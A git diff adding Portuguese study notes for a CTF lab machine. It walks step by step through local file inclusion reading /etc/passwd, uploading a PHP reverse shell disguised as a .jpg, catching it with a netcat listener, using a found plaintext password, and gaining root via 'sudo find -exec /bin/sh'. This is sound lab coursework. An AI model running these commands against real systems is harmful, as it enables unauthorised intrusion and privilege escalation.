@@ -125,3 +125,62 @@ simplificada: http://192.168.56.102/language.php?lang=/uploads/revshell.php.jpg
 8. ssh -i /home/kali/.ssh/id_rsa_root -p 2299 root@192.168.56.111\
 9. logo como root e dou ls descubro a flag.sh de novo
 10. dou bash flag.sh e acho a ultima flag
+
+--
+
+# passo a passo da global
+
+#### máquina ctf-for-aziz (kira)
+
+### doc referente, colocar no relatõrio:
+https://portswigger.net/web-security/file-path-traversal
+https://gtfobins.github.io/
+
+#### lfi da o poder de ler um arquivo no servidor sem estar dentro dele
+#### vamos jogar um arquivo remotamente com um backdoor, que iremos executar depois
+### printar com o horário do windows no relatõrio!
+
+0. ip -br -c a (ip do kali)
+1. netdiscover
+2. nmap
+#### descobrimos a falha de LFI após explorar bastante o frontend (local file inclusiion) (Inclusão Local de Arquivo) na url: http://192.168.56.102/language.php?lang=en.php (devivo a url ter ? e =)
+4. mudar para http://192.168.56.102/language.php?lang=../../../etc/passwd #(vulnerabilidade que o postswigger ensina)
+5. cd /usr/share/webshells/php #(acessa os backdoors salvos do kali)
+6. cp php-reverse-shell.php shell.php.jpg #transforma em imagem, porque o TIPO DE UPLOAD DO SITE, É IMAGEM
+7. nano shell.php.jpg
+8. dentro do arquivo, mudar a linha escrito "ip" (para o ip do cliente kali), o port o professor deixou 1234 quieto
+9. faça o upload do arquivo, no caminho (other locations -> usr/share etc) pela interface do Kali...
+10. gobuster dir -u (ip do servidor) -w /usr/share/wordlists/dirb/big.txt
+11. o gobuster retorna o caminho onde o arquivo foi parar, no caso http://<ip_do_servidor>/uploads/, onde clicamos nesse link e vemos ele lá dentro, no caso em http://192.168.56.102/uploads/
+12. nc -nlvp 1234 #(porta do arquivo)
+13. pegamos a url vulnerável (http://192.168.56.102/language.php?lang=en.php), mudamos o language.php?lang=(caminho do arquivo no servidor), ou seja, http://192.168.56.102/language.php?lang=/uploads/shell.php.jpg
+#### voce acabou de entrar no servidor num usuario qualquer pelo terminal, ai precisa agora caçar onde ta o /www/var/
+14. python3 -c "import pty;pty.spawn('/bin/bash')"
+15. cd /home
+16. ls (vermos os usuarios que existem no servidor)
+17. cd bassam/ (usuario que queremos ver)
+18. ls
+#### encontramos a primeira flag
+19. cat user.txt #da permissao negada, precisa entrar no bassam
+20. cd /var/www/hml #todo o projeto web estã aqui
+21. cd supersecret-for-aziz
+22. ls $(aqui encontrarmos uma credencial, chamada bassam-pass.txt)
+23. cat bassam-pass.txt #(retorna uma senha 123)
+24. su bassam #(acessar o usuario)
+25. 123 #senha do bassam
+#### entramos no usuario que nao tinhamos acesso
+26. cd /home
+27. ls
+28. cd bassam #(voltamos ao bassam)
+29. cat user.txt #(e agora podemos pegar esse arquivo, pois estamos no bassam, isso ~e uma flag!)
+#### tentamos entrar no root
+30. cd /root #(aqui deu erro, ou seja, nao da)
+30. sudo su
+31. tentamos a senhar 123, senha do bassam
+32. sudo -l #(descobrir usuarios que tem permissao para executar comandos como root)
+33. whoami #(vemos que estamos no bassam apenas)
+34. acessamos o site https://gtfobins.github.io/, ctrl + f, procuramos o binário "find"
+35. pegar o comando e colocar no terminal estando no bassam (adicione o sudo na frente):  sudo find . -exec /bin/sh \; -quit
+36. whoimi #(retorna que somos o bassam, mas abaixo aparece que temos o root também!)
+37. id #(vai aparecer que somos o root, apenas uma confirmacao extra!)
+38. cat user.txt #(agora podemos acessar esse arquivo maldito, última flag)
